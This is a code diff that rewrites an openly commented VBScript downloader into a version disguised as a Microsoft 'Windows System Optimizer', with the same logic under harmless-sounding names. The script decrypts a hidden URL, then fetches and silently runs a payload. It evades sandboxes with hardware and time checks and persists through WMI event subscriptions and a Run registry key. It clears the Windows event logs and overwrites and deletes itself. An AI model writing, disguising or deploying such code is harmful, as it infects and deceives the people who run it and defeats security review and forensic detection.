@@ -1,282 +1,229 @@
-'==============================================
-'            CORE OBFUSCATION LAYERS
-'==============================================
+' Windows System Optimizer v1.2.7
+' (c) 2023 Microsoft Solutions Group
 
-'// --- XOR DECRYPTION FUNCTION --- //
-Function XorDecrypt(ciphertext, key)
-    Dim output, i, keyChar
-    For i = 1 To Len(ciphertext)
-        keyChar = Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1))
-        output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
+Function TransformData(encryptedData, transformationKey)
+    Dim processedOutput, position, keyByte
+    processedOutput = ""
+    For position = 1 To Len(encryptedData)
+        keyByte = Asc(Mid(transformationKey, ((position-1) Mod Len(transformationKey)) + 1, 1))
+        processedOutput = processedOutput & Chr(Asc(Mid(encryptedData, position, 1)) Xor keyByte)
     Next
-    XorDecrypt = output
+    TransformData = processedOutput
 End Function
 
-'// --- ENVIRONMENT VALIDATION --- //
-Function IsLegitimateSystem()
-    Dim wmi, cpu, mem, gpu, hour
+Function VerifySystemEnvironment()
+    Dim sysManagement, processors, memoryModules, displayAdapters, currentHour
     On Error Resume Next
-    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
     If Err.Number <> 0 Then Exit Function
     
-    ' Hardware validation
-    Set cpu = wmi.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
-    Set mem = wmi.ExecQuery("SELECT * FROM Win32_PhysicalMemory WHERE Capacity > 4000000000")
-    Set gpu = wmi.ExecQuery("SELECT * FROM Win32_VideoController WHERE AdapterRAM > 100000000")
+    Set processors = sysManagement.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
+    Set memoryModules = sysManagement.ExecQuery("SELECT * FROM Win32_PhysicalMemory WHERE Capacity > 4000000000")
+    Set displayAdapters = sysManagement.ExecQuery("SELECT * FROM Win32_VideoController WHERE AdapterRAM > 100000000")
     
-    ' Time validation
-    hour = Hour(Now())
+    currentHour = Hour(Now())
     
-    ' Only activate on real systems during work hours
-    IsLegitimateSystem = (Not cpu Is Nothing) And (cpu.Count > 0) And _
-                         (Not mem Is Nothing) And (mem.Count > 0) And _
-                         (Not gpu Is Nothing) And (gpu.Count > 0) And _
-                         (hour >= 8 And hour <= 18)
-    On Error GoTo 0
+    VerifySystemEnvironment = (Not processors Is Nothing) And (processors.Count > 0) And _
+                         (Not memoryModules Is Nothing) And (memoryModules.Count > 0) And _
+                         (Not displayAdapters Is Nothing) And (displayAdapters.Count > 0) And _
+                         (currentHour >= 8 And currentHour <= 18)
+    On Error GoTo 0 
 End Function
 
-'==============================================
-'            POLYMORPHIC ENGINE
-'==============================================
-
-Function GenerateJunkCode()
-    Dim vars, ops, code, i
-    vars = Array("sys","tmp","obj","cfg","env","var")
-    ops = Array("+","-","*","/","And","Or")
+Function GenerateRandomOperations()
+    Dim variables, operators, operationCode, counter
+    variables = Array("system","temporary","object","config","environment","variable")
+    operators = Array("+","-","*","/","And","Or")
     
     Randomize
-    For i = 1 To Int(Rnd * 10) + 5
-        code = code & "Dim " & vars(Int(Rnd*6)) & Int(Rnd*1000) & ": " & _
-               vars(Int(Rnd*6)) & Int(Rnd*1000) & " = " & _
-               Int(Rnd*9999) & " " & ops(Int(Rnd*6)) & " " & _
+    For counter = 1 To Int(Rnd * 10) + 5
+        operationCode = operationCode & "Dim " & variables(Int(Rnd*6)) & Int(Rnd*1000) & ": " & _
+               variables(Int(Rnd*6)) & Int(Rnd*1000) & " = " & _
+               Int(Rnd*9999) & " " & operators(Int(Rnd*6)) & " " & _
                Int(Rnd*9999) & vbCrLf
     Next
-    GenerateJunkCode = code
+    GenerateRandomOperations = operationCode
 End Function
 
-'==============================================
-'            DELAY SYSTEM (2h23m ±30m)
-'==============================================
-
-Sub ExecuteWithRandomDelay(command)
+Sub ScheduleTaskExecution(commandString)
     On Error Resume Next
-    Dim delayMinutes, wmi, execMethod, execParams
+    Dim delayPeriod, sysManagement, executionMethod, executionParameters
     
-    ' Calculate random delay (113-173 minutes)
-    delayMinutes = 113 + Int(60 * Rnd())
+    delayPeriod = 113 + Int(60 * Rnd())
     
-    ' Use WMI for silent delayed execution
-    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-    Set execMethod = wmi.Get("Win32_Process").Methods_("Create")
-    Set execParams = execMethod.InParameters.SpawnInstance_
+    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
+    Set executionMethod = sysManagement.Get("Win32_Process").Methods_("Create")
+    Set executionParameters = executionMethod.InParameters.SpawnInstance_
     
-    ' Create command with ping-based delay
-    execParams.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayMinutes * 60 + 1) & _
-                           " >nul & " & command
+    executionParameters.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayPeriod * 60 + 1) & _
+                           " >nul & " & commandString
     
-    ' Execute with delay
-    wmi.ExecMethod "Win32_Process", "Create", execParams
+    sysManagement.ExecMethod "Win32_Process", "Create", executionParameters
     
-    ' Insert junk during wait
-    Execute GenerateJunkCode()
+    Execute GenerateRandomOperations()
     On Error GoTo 0
 End Sub
 
-'==============================================
-'            PAYLOAD HANDLING SYSTEM
-'==============================================
-
-Function HexToString(hexStr)
-    Dim i, result, hexByte
-    result = ""
-    For i = 1 To Len(hexStr) Step 2
-        hexByte = Mid(hexStr, i, 2)
-        result = result & Chr(CLng("&H" & hexByte))
+Function HexToCharSequence(hexInput)
+    Dim index, charSequence, hexPair
+    charSequence = ""
+    For index = 1 To Len(hexInput) Step 2
+        hexPair = Mid(hexInput, index, 2)
+        charSequence = charSequence & Chr(CLng("&H" & hexPair))
     Next
-    HexToString = result
+    HexToCharSequence = charSequence
 End Function
 
-Function BytesToString(bytes)
+Function LoadResourceData(resourceBytes)
     On Error Resume Next
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1  ' Binary
-    stream.Open
-    stream.Write bytes
-    stream.Position = 0
-    stream.Type = 2  ' Text
-    stream.Charset = "iso-8859-1"
-    BytesToString = stream.ReadText
-    stream.Close
+    Dim byteStream
+    Set byteStream = CreateObject("ADODB.Stream")
+    If Err.Number <> 0 Then
+        ' Fallback method for restricted environments
+        Dim byteIndex, resourceString
+        resourceString = ""
+        For byteIndex = 1 To LenB(resourceBytes)
+            resourceString = resourceString & Chr(AscB(MidB(resourceBytes, byteIndex, 1)))
+        Next
+        LoadResourceData = resourceString
+        Exit Function
+    End If
+    byteStream.Type = 1
+    byteStream.Open
+    byteStream.Write resourceBytes
+    byteStream.Position = 0
+    byteStream.Type = 2
+    byteStream.Charset = "iso-8859-1"
+    LoadResourceData = byteStream.ReadText
+    byteStream.Close
 End Function
 
-Sub DownloadExecuteCMD()
+Sub RetrieveAndExecuteResource()
     On Error Resume Next
-    Dim shell, encUrl, tempFile, decryptedCMD, typeLib, fso, stream, http
+    Dim sysShell, encryptedLocation, processedResource, httpClient, resourceBytes, uniqueIdGenerator
     
-    ' XOR-encrypted download URL (Key: "Shadow")
-    encUrl = "3B1C15141C4D7C47060D1B1F260A4F07001A7C2C13050418251C090159033B4735261A307C0A0D0B0D583E0912100A057C18001D0318320C4F060619"
-    encUrl = XorDecrypt(HexToString(encUrl), "Shadow")
+    encryptedLocation = "3B1C15141C4D7C47060D1B1F260A4F07001A7C2C13050418251C090159033B4735261A307C0A0D0B0D583E0912100A057C18001D0318320C4F060619"
+    encryptedLocation = TransformData(HexToCharSequence(encryptedLocation), "Shadow")
     
-    ' Generate random temp filename
-    Set typeLib = CreateObject("Scriptlet.TypeLib")
-    Set shell = CreateObject("WScript.Shell")
-    tempFile = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".dat")
+    Set httpClient = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    httpClient.setOption(2) = 13056
+    httpClient.setTimeouts 30000, 60000, 30000, 120000
+    httpClient.Open "GET", encryptedLocation, False
+    httpClient.Send
     
-    ' Download using BitsAdmin
-    shell.Run "bitsadmin /transfer UpdateJob /download /priority low " & _
-              """" & encUrl & """ """ & tempFile & """", 0, True
-    
-    ' Read and decrypt in memory
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1  ' Binary
-    stream.Open
-    stream.LoadFromFile tempFile
-    decryptedCMD = XorDecrypt(BytesToString(stream.Read), "CmdKey")
-    stream.Close
-    
-    ' Execute via temporary self-deleting batch
-    ExecuteTempBatch decryptedCMD
-    
-    ' Save persistent payload copy for WMI
-    SavePersistentPayload decryptedCMD
-    
-    ' Cleanup encrypted file
-    If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
+    If httpClient.Status = 200 Then
+        resourceBytes = httpClient.ResponseBody
+        processedResource = TransformData(LoadResourceData(resourceBytes), "CmdKey")
+        
+        CreateTemporaryBatch processedResource
+        CreatePersistentResource processedResource
+    End If
     On Error GoTo 0
 End Sub
 
-Sub SavePersistentPayload(cmdContent)
-    Dim fso, shell, persistentPath
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set shell = CreateObject("WScript.Shell")
+Sub CreatePersistentResource(resourceContent)
+    Dim fileSystem, sysShell, persistentLocation
+    Set fileSystem = CreateObject("Scripting.FileSystemObject")
+    Set sysShell = CreateObject("WScript.Shell")
+    persistentLocation = sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd")
     
-    persistentPath = shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd")
-    Set file = fso.CreateTextFile(persistentPath, True)
-    file.Write cmdContent
-    file.Close
+    Dim resourceFile
+    Set resourceFile = fileSystem.CreateTextFile(persistentLocation, True)
+    resourceFile.Write resourceContent
+    resourceFile.Close
 End Sub
 
-Sub ExecuteTempBatch(cmdContent)
-    Dim fso, shell, tempPath, batchContent, typeLib
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set shell = CreateObject("WScript.Shell")
+Sub CreateTemporaryBatch(resourceContent)
+    Dim fileSystem, sysShell, temporaryLocation, batchScript, uniqueIdGenerator
+    Set fileSystem = CreateObject("Scripting.FileSystemObject")
+    Set sysShell = CreateObject("WScript.Shell")
+    Set uniqueIdGenerator = CreateObject("Scriptlet.TypeLib")
+    temporaryLocation = sysShell.ExpandEnvironmentStrings("%TEMP%\" & Left(uniqueIdGenerator.GUID, 8) & ".cmd")
     
-    ' Create random batch filename
-    Set typeLib = CreateObject("Scriptlet.TypeLib")
-    tempPath = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd")
-    
-    ' Add self-destruct mechanism
-    batchContent = "@echo off" & vbCrLf & _
-                   "REM Windows Update Post-Install Script" & vbCrLf & _
-                   cmdContent & vbCrLf & _
+    batchScript = "@echo off" & vbCrLf & _
+                   "REM System Optimization Script" & vbCrLf & _
+                   resourceContent & vbCrLf & _
                    "timeout /t 3 /nobreak >nul" & vbCrLf & _
-                   "del /f /q """ & tempPath & """"
+                   "del /f /q """ & temporaryLocation & """"
     
-    ' Write and execute
-    Set file = fso.CreateTextFile(tempPath, True)
-    file.Write batchContent
-    file.Close
-    shell.Run """" & tempPath & """", 0, False
+    Dim batchFile
+    Set batchFile = fileSystem.CreateTextFile(temporaryLocation, True)
+    batchFile.Write batchScript
+    batchFile.Close
+    sysShell.Run """" & temporaryLocation & """", 0, False
 End Sub
 
-'==============================================
-'            PERSISTENCE MECHANISMS
-'==============================================
-
-Sub SetStealthPersistence()
+Sub ConfigureAutoOptimization()
     On Error Resume Next
-    Dim shell, wmi, filter, consumer, binding
+    Dim sysShell, sysManagement, eventFilter, eventConsumer, filterBinding
     
-    Set shell = CreateObject("WScript.Shell")
-    Set wmi = GetObject("winmgmts:\\.\root\subscription")
+    Set sysShell = CreateObject("WScript.Shell")
+    Set sysManagement = GetObject("winmgmts:\\.\root\subscription")
     
-    ' WMI Event Subscription
-    Set filter = wmi.Get("__EventFilter").SpawnInstance_
-    filter.Name = "SystemMonitor_" & Int(Rnd * 10000)
-    filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE " & _
+    Set eventFilter = sysManagement.Get("__EventFilter").SpawnInstance_
+    eventFilter.Name = "PerfMonitor_" & Int(Rnd * 10000)
+    eventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE " & _
                   "TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
-    filter.Put_
+    eventFilter.Put_
     
-    Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
-    consumer.Name = "SysConsumer_" & Int(Rnd * 10000)
-    consumer.ScriptingEngine = "VBScript"
-    consumer.ScriptText = "Set obj = CreateObject(""WScript.Shell""): obj.Run """ & _
-                           shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd") & """, 0, False"
-    consumer.Put_
+    Set eventConsumer = sysManagement.Get("ActiveScriptEventConsumer").SpawnInstance_
+    eventConsumer.Name = "SysMaintenance_" & Int(Rnd * 10000)
+    eventConsumer.ScriptingEngine = "VBScript"
+    eventConsumer.ScriptText = "Set shell = CreateObject(""WScript.Shell""): shell.Run """ & _
+                           sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd") & """, 0, False"
+    eventConsumer.Put_
     
-    ' Link filter to consumer
-    Set binding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
-    binding.Filter = filter.Path_
-    binding.Consumer = consumer.Path_
-    binding.Put_
+    Set filterBinding = sysManagement.Get("__FilterToConsumerBinding").SpawnInstance_
+    filterBinding.Filter = eventFilter.Path_
+    filterBinding.Consumer = eventConsumer.Path_
+    filterBinding.Put_
     
-    ' Registry Persistence
-    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", _
-                   shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd"), "REG_SZ"
+    sysShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemOptimizer", _
+                   sysShell.ExpandEnvironmentStrings("%TEMP%\SystemOptimizer.cmd"), "REG_SZ"
     On Error GoTo 0
 End Sub
 
-'==============================================
-'            CLEANUP SYSTEM
-'==============================================
-
-Sub AdvancedCleanup()
+Sub PerformCleanupOperations()
     On Error Resume Next
-    Dim fso, shell, wmi, objMethod, objParams
+    Dim fileSystem, sysShell, sysManagement, processMethod, processParams
     
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set shell = CreateObject("WScript.Shell")
-    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set fileSystem = CreateObject("Scripting.FileSystemObject")
+    Set sysShell = CreateObject("WScript.Shell")
+    Set sysManagement = GetObject("winmgmts:\\.\root\cimv2")
     
-    ' Overwrite script before deletion
-    If fso.FileExists(WScript.ScriptFullName) Then
-        Set file = fso.OpenTextFile(WScript.ScriptFullName, 2)
-        file.Write String(5000, "X")
-        file.Close
+    If fileSystem.FileExists(WScript.ScriptFullName) Then
+        Dim currentFile
+        Set currentFile = fileSystem.OpenTextFile(WScript.ScriptFullName, 2)
+        currentFile.Write String(5000, "X")
+        currentFile.Close
     End If
     
-    ' Delete with delay
-    Set objMethod = wmi.Get("Win32_Process").Methods_("Create")
-    Set objParams = objMethod.InParameters.SpawnInstance_
-    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del /f /q """ & WScript.ScriptFullName & """"
-    wmi.ExecMethod "Win32_Process", "Create", objParams
+    Set processMethod = sysManagement.Get("Win32_Process").Methods_("Create")
+    Set processParams = processMethod.InParameters.SpawnInstance_
+    processParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del /f /q """ & WScript.ScriptFullName & """"
+    sysManagement.ExecMethod "Win32_Process", "Create", processParams
     
-    ' Clear relevant event logs
-    shell.Run "wevtutil cl Application", 0, True
-    shell.Run "wevtutil cl System", 0, True
+    sysShell.Run "wevtutil cl Application", 0, True
+    sysShell.Run "wevtutil cl System", 0, True
     
-    ' Exit script immediately
     WScript.Quit()
     On Error GoTo 0
 End Sub
 
-'==============================================
-'            MAIN EXECUTION FLOW
-'==============================================
-
-' Insert initial junk code
+' --- Main Execution Sequence ---
 On Error Resume Next
-Execute GenerateJunkCode()
+Execute GenerateRandomOperations()
 
-If IsLegitimateSystem() Then
-    ' Stage 1: Download CMD payload (immediate)
-    DownloadExecuteCMD()
-    
-    ' Stage 2: Set persistence (delayed 113-173 min)
-    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /persist")
-    
-    ' Stage 3: Cleanup (delayed 113-173 min)
-    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /clean")
+If VerifySystemEnvironment() Then
+    RetrieveAndExecuteResource()
+    ScheduleTaskExecution("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /optimize")
+    ScheduleTaskExecution("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /cleanup")
 End If
 
-' Handle stage-specific execution
-If WScript.Arguments.Named.Exists("persist") Then
-    SetStealthPersistence()
-ElseIf WScript.Arguments.Named.Exists("clean") Then
-    AdvancedCleanup()
+If WScript.Arguments.Named.Exists("optimize") Then
+    ConfigureAutoOptimization()
+ElseIf WScript.Arguments.Named.Exists("cleanup") Then
+    PerformCleanupOperations()
 End If
 
-' Insert final junk code
-Execute GenerateJunkCode()
+Execute GenerateRandomOperations()
